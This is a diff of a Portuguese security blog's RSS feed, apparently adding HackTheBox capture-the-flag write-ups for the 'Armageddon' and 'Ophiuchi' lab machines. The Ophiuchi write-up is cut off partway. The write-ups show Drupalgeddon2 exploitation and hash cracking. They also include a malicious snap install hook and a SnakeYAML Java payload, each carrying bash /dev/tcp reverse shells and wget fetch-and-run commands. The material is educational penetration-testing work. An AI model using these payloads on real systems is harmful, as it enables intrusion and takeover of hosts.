@@ -1,4 +1,3 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Haderach</title>
@@ -6,8 +5,260 @@
         <description>Recent content in Posts on Haderach</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 03 Jul 2021 13:04:58 -0300</lastBuildDate>
+        <lastBuildDate>Fri, 20 Aug 2021 20:32:28 -0300</lastBuildDate>
         <atom:link href="https://brunomcuesta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HackTheBox - Armageddon</title>
+            <link>https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/</link>
+            <pubDate>Fri, 20 Aug 2021 20:32:28 -0300</pubDate>
+            
+            <guid>https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/</guid>
+            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Armageddon&amp;rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.233
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
+# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency).</description>
+            <content type="html"><![CDATA[
+    <img src="https://i.imgur.com/j1UBIGf.jpg"  alt="Armageddon Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
+<h3 id="informações-da-máquina">Informações da Máquina</h3>
+<p>IP: 10.10.10.233</p>
+<p>Sistema Operacional: Linux</p>
+<p>Nível de dificuldade: Easy</p>
+<h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
+<h4 id="port-scan">Port Scan</h4>
+<p>Iniciando um scan completo em todas as portas TCP abertas com nmap:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.233
+Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
+|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jun 26 22:19:25 2021 -- 1 IP address (1 host up) scanned in 27.48 seconds</span>
+</code></pre></div><h4 id="webserver">Webserver</h4>
+<p>O host possui apenas duas portas abertas, a 22 e a 80. Acessando a porta 80 encontramos a seguinte página.</p>
+
+    <img src="https://i.imgur.com/M9Bo9fS.png"  alt="Armageddon - Página Inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No robots.txt é possível visualizar diversas URLs liberadas e bloqueadas para indexação.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.233/robots.txt
+
+User-agent: *
+Crawl-delay: 10
+# CSS, JS, Images
+Allow: /misc/*.css$
+Allow: /misc/*.css?
+Allow: /misc/*.js$
+Allow: /misc/*.js?
+Allow: /misc/*.gif
+Allow: /misc/*.jpg
+Allow: /misc/*.jpeg
+Allow: /misc/*.png
+Allow: /modules/*.css$
+Allow: /modules/*.css?
+Allow: /modules/*.js$
+Allow: /modules/*.js?
+Allow: /modules/*.gif
+Allow: /modules/*.jpg
+Allow: /modules/*.jpeg
+Allow: /modules/*.png
+Allow: /profiles/*.css$
+Allow: /profiles/*.css?
+Allow: /profiles/*.js$
+Allow: /profiles/*.js?
+Allow: /profiles/*.gif
+Allow: /profiles/*.jpg
+Allow: /profiles/*.jpeg
+Allow: /profiles/*.png
+Allow: /themes/*.css$
+Allow: /themes/*.css?
+Allow: /themes/*.js$
+Allow: /themes/*.js?
+Allow: /themes/*.gif
+Allow: /themes/*.jpg
+Allow: /themes/*.jpeg
+Allow: /themes/*.png
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+</code></pre></div><p>Com o objetivo de obter mais informações da página foi usado o &lsquo;whatweb&rsquo; para visualizar mais detalhes.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whatweb http://10.10.10.233
+</code></pre></div><p>A saída do comando revelou que o host está usando um CMS PHP chamado Drupal em sua versão 7.</p>
+<pre><code class="language-textplain" data-lang="textplain">http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en],
+Country[RESERVED][ZZ], Drupal, 
+HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], 
+IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)],
+PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon],
+Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon],
+UncommonHeaders[x-content-type-options,x-generator],
+X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
+</code></pre><h3 id="vulnerabilidade">Vulnerabilidade</h3>
+<p>Com a versão do CMS foi feita a busca por vulnerabilidades e exploits.</p>
+
+    <img src="https://i.imgur.com/ggD5SPz.png"  alt="Google - Drupal Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O exploit encontrado é referente a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a> e está disponível no <a href="https://github.com/pimps/CVE-2018-7600">github</a>. O exploit permite a um atacante remoto executar arbitrariamente comandos no host (RCE - Remote Code Execution).</p>
+
+    <img src="https://i.imgur.com/U1zMkBR.png"  alt="Github - Drupal 7 Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="exploração">Exploração</h3>
+<p>Clonando o projeto para a máquina local.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pimps/CVE-2018-7600.git
+</code></pre></div><p>Executando o script em python para efetuar o RCE (Remote Code Execution).</p>
+
+    <img src="https://i.imgur.com/125h1zN.png"  alt="Execução do exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Também existe um exploit no <a href="https://www.exploit-db.com/exploits/44449">exploitdb</a> que permite obter um &lsquo;reverse shell&rsquo; através do metasploit.</p>
+
+    <img src="https://i.imgur.com/jQcUYiI.png"  alt="Metasploit Drupalgeddon2"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Com o metasploit foi possível visualizar os arquivos de configuração da aplicação e obter as credenciais do banco Mysql. O caminho para o arquivo de configuração do Drupal pode ser obtido consultando a sua <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory">doc</a> oficial.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/var/www/html/sites/default/cat settings.php
+</code></pre></div>
+    <img src="https://i.imgur.com/t0LN8uD.png"  alt="Drupal Settings"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Credenciais do banco Mysql.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">drupaluser:CQHEy@9M*m23gBVj
+</code></pre></div><p>Conectando ao banco de dados com as credenciais se obtêm os usuários e senhas cadastrados.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u drupaluser -e <span style="color:#e6db74">&#39;use drupal;show tables;select name, pass from users;&#39;</span> -p
+</code></pre></div>
+    <img src="https://i.imgur.com/hCufwve.png"  alt="Usuários e senhas Mysql"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Identificando o tipo de &lsquo;hash&rsquo; usada para cadastrar a senha no banco Mysql com o hashcat.</p>
+
+    <img src="https://i.imgur.com/Cpu6Zzq.png"  alt="Hashcat format"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Efetuando a quebra de &lsquo;hash&rsquo; com hashcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hashcat -m <span style="color:#ae81ff">7900</span> hash /usr/share/wordlists/rockyou.txt --force
+</code></pre></div><p>A senha encontrada é &ldquo;booboo&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">brucetherealadmin:booboo
+</code></pre></div><p>Conectando via SSH com as credenciais válidas e obtendo a flag do user.</p>
+
+    <img src="https://i.imgur.com/Aq0a7W3.png"  alt="User flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a versão do sistema operacional.</p>
+
+    <img src="https://i.imgur.com/6AAfVov.png"  alt="Versão OS"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
+<p>Um procedimento muito usual para escalar privilégios e verificar as permissões do usuário com o sudo. Ao rodar o &lsquo;sudo -l&rsquo; é confirmado que o usuário possui privilégios de root com o &lsquo;snap&rsquo;. Pacotes snaps não necessitam ser instalados na máquina para serem executados.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/snap install *
+</code></pre></div><p>Verificando a versão do snap instalado no sistema.</p>
+
+    <img src="https://i.imgur.com/pBk3Ybl.png"  alt="Versão do Snap"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No <a href="https://gtfobins.github.io/gtfobins/snap/#sudo">GTFOBins</a> foi encontrada a forma de abusar do snap com o sudo.</p>
+
+    <img src="https://i.imgur.com/wAsAXaW.png"  alt="GTFOBins snap sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Antes de gerar o pacote snap malicioso deve-se instalar o fpm na máquina local seguindo o seu <a href="https://fpm.readthedocs.io/en/latest/installing.html">manual</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo gem install --no-document fpm
+$ sudo apt install squashfs-tools
+</code></pre></div><p>Criando o script makesnap.sh para gerar o pacote snap. O script possui uma linha de código que é o comando de &lsquo;reverse shell&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  <span style="color:#75715e">#!/bin/bash</span>
+  
+  COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#39;&#34;</span>
+  cd <span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+  mkdir -p meta/hooks
+  printf <span style="color:#e6db74">&#39;#!/bin/bash\n%s;&#39;</span> <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; meta/hooks/install
+  chmod +x meta/hooks/install
+  fpm -n root -s dir -t snap -a all meta
+</code></pre></div><p>Executando o script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod +x makesnap.sh
+$ ./makesnap.sh
+</code></pre></div><p>O script vai gerar uma pasta no diretório /tmp. Este diretório deve ser compartilhado para poder subir o arquivo .snap ao host.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server &lt;port&gt;
+</code></pre></div><p>No host foi usado o wget para fazer a transferência do arquivo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://&lt;ip&gt;:&lt;port&gt;/xxxx_1.0_all.snap
+</code></pre></div><p>Abrindo a porta local para receber o &lsquo;reverse shell&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rlwrap nc -lvnp &lt;port&gt;
+</code></pre></div><p>Após abrir a porta local o passo seguinte é executar o comando de instalação do pacote malicioso com o sudo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+</code></pre></div><p>Recebendo o &lsquo;reverse shell&rsquo; com a shell do root.</p>
+
+    <img src="https://i.imgur.com/MYKIwZ2.png"  alt="Root Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a &lsquo;flag&rsquo; do usuário root.</p>
+
+    <img src="https://i.imgur.com/Ig3Zjib.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Até a próxima!</p>
+]]></content>
+        </item>
         
         <item>
             <title>HackTheBox - Ophiuchi</title>
@@ -20,42 +271,32 @@ Informações da Máquina IP: 10.10.10.227
 Sistema Operacional: Linux
 Nível de dificuldade: Medium</description>
             <content type="html"><![CDATA[
-
-
     <img src="https://i.imgur.com/BQZxGFi.jpg"  alt="Ophiuchi Cover"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Nesta máquina veremos uma vulnerabilidade de desserialização Yaml. Esta vulnerabilidade permite ao atacante obter acesso ao host através de um RCE (Remote Command Execution). O &lsquo;privesc&rsquo; é feito com a obtenção de credenciais válidas após enumerar diretórios e arquivos dos programas e serviços executados no servidor e abusando das permissões de usuário para obter acesso ao host como usuário root.</p>
-
 <h3 id="informações-da-máquina">Informações da Máquina</h3>
-
 <p>IP: 10.10.10.227</p>
-
 <p>Sistema Operacional: Linux</p>
-
 <p>Nível de dificuldade: Medium</p>
-
 <h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
-
 <h4 id="port-scan">Port Scan</h4>
-
 <p>Esta é a saída do Nmap após um scan utilizando os scripts para verificação de versão dos serviços disponíveis e possíveis vulnerabilidades.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Tue Jun 29 18:17:23 2021 as: nmap -vvv -sC -sV -p 22,8080 -Pn -oN details.txt 10.10.10.227</span>
-Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10</span>.10.10.227
-Host is up, received user-set <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span>.24s latency<span style="color:#f92672">)</span>.
-Scanned at <span style="color:#ae81ff">2021</span>-06-29 <span style="color:#ae81ff">18</span>:17:25 -03 <span style="color:#66d9ef">for</span> 17s
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.227
+Host is up, received user-set <span style="color:#f92672">(</span>0.24s latency<span style="color:#f92672">)</span>.
+Scanned at 2021-06-29 18:17:25 -03 <span style="color:#66d9ef">for</span> 17s
 
 PORT     STATE SERVICE REASON         VERSION
-<span style="color:#ae81ff">22</span>/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH <span style="color:#ae81ff">8</span>.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol <span style="color:#ae81ff">2</span>.0<span style="color:#f92672">)</span>
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
 | ssh-hostkey: 
 |   <span style="color:#ae81ff">3072</span> 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0<span style="color:#f92672">=</span>
 |   <span style="color:#ae81ff">256</span> 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs<span style="color:#f92672">=</span>
-|   <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">17</span>:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
-<span style="color:#ae81ff">8080</span>/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> Apache Tomcat <span style="color:#ae81ff">9</span>.0.38
+8080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> Apache Tomcat 9.0.38
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Parse YAML
@@ -63,140 +304,108 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style="color:#75715e"># Nmap done at Tue Jun 29 18:17:42 2021 -- 1 IP address (1 host up) scanned in 19.64 seconds</span></code></pre></div>
-<p>Observando o resultado confirmamos a existência de duas portas abertas, a 22 (SSH) e a 8080 (Tomcat).</p>
-
+<span style="color:#75715e"># Nmap done at Tue Jun 29 18:17:42 2021 -- 1 IP address (1 host up) scanned in 19.64 seconds</span>
+</code></pre></div><p>Observando o resultado confirmamos a existência de duas portas abertas, a 22 (SSH) e a 8080 (Tomcat).</p>
 <h4 id="webserver">Webserver</h4>
-
 <p>Acessando a aplicação web na porta 8080 temos a seguinte página.</p>
-
 
     <img src="https://i.imgur.com/j3hprxn.png"  alt="Página inicial"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>A página criada é uma ferramenta de &lsquo;parsing&rsquo;. Ou seja, desserializa o conteúdo enviado em sintaxe Yaml e o converte no &lsquo;backend&rsquo; em Java. Para testar a aplicação foi enviado um conteúdo aleatório na sintaxe Yaml.</p>
-
 
     <img src="https://i.imgur.com/tGPlLPn.png"  alt="Teste do parser"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>O servidor responde com uma mensagem de erro.</p>
-
 
     <img src="https://i.imgur.com/9GrrsHO.png"  alt="Mensagem de erro"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>A mensagem informa que a &ldquo;funcionalidade foi desativada devido a razões de segurança&rdquo;, o que confirma que nesta página está a vulnerabilidade.</p>
-
 <h3 id="vulnerabilidade">Vulnerabilidade</h3>
-
-<p>Pesquisando sobre &ldquo;Yaml exploit&rdquo; foi encontrado um exploit no <a href="https://github.com/artsploit/yaml-payload" target="_blank">github</a> que permite um RCE (Remote Command Execution).</p>
-
+<p>Pesquisando sobre &ldquo;Yaml exploit&rdquo; foi encontrado um exploit no <a href="https://github.com/artsploit/yaml-payload">github</a> que permite um RCE (Remote Command Execution).</p>
 <p>A &ldquo;desserialização SnakeYAML&rdquo; consiste em criar um arquivo .jar para que o servidor o execute.</p>
-
 <h3 id="exploração">Exploração</h3>
-
 <p>O primeiro passo é fazer o clone do projeto na máquina local.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/artsploit/yaml-payload.git</code></pre></div>
-<p>Alterar o arquivo AwesomeScriptEngineFactory.java, colocando o payload para subir um script em bash.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/artsploit/yaml-payload.git
+</code></pre></div><p>Alterar o arquivo AwesomeScriptEngineFactory.java, colocando o payload para subir um script em bash.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wget http://&lt;ip&gt;:&lt;port&gt;/myshell.sh -O /tmp/myshell.sh&#34;</span><span style="color:#f92672">);</span>
-Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/myshell.sh&#34;</span><span style="color:#f92672">);</span></code></pre></div>
-<p>Feita a alteração é necessário ter o <a href="https://openjdk.java.net/" target="_blank">OpenJDK</a> instalado para efetuar a compilação do arquivo. No caso de não existir o OpenJDK na máquina do atacante, o seguinte comando faz a instalação.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt install openjdk-11-jdk</code></pre></div>
-<p>Efetuando a compilação do arquivo .java para gerar o .class.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ javac src/artsploit/AwesomeScriptEngineFactory.java</code></pre></div>
-<p>Gerando o arquivo yaml-payload.jar.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ jar -cvf yaml-payload.jar -C src/ .</code></pre></div>
-<p>Após a criação do executável .jar é necessário criar o script em bash chamado myshell.sh, que fará o &lsquo;reverse shell&rsquo;. Este é o seu conteúdo.</p>
+Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/myshell.sh&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><p>Feita a alteração é necessário ter o <a href="https://openjdk.java.net/">OpenJDK</a> instalado para efetuar a compilação do arquivo. No caso de não existir o OpenJDK na máquina do atacante, o seguinte comando faz a instalação.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt install openjdk-11-jdk
+</code></pre></div><p>Efetuando a compilação do arquivo .java para gerar o .class.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ javac src/artsploit/AwesomeScriptEngineFactory.java
+</code></pre></div><p>Gerando o arquivo yaml-payload.jar.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ jar -cvf yaml-payload.jar -C src/ .
+</code></pre></div><p>Após a criação do executável .jar é necessário criar o script em bash chamado myshell.sh, que fará o &lsquo;reverse shell&rsquo;. Este é o seu conteúdo.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
-</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; <span style="color:#ae81ff">0</span>&gt;&amp;<span style="color:#ae81ff">1</span></code></pre></div>
-<p>Na máquina local, duas portas foram abertas para receber as conexões: uma para disponibilizar o .jar ao servidor e a outra para enviar o myshell.sh. Este é payload enviado no site para iniciar o processo.</p>
+</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Na máquina local, duas portas foram abertas para receber as conexões: uma para disponibilizar o .jar ao servidor e a outra para enviar o myshell.sh. Este é payload enviado no site para iniciar o processo.</p>
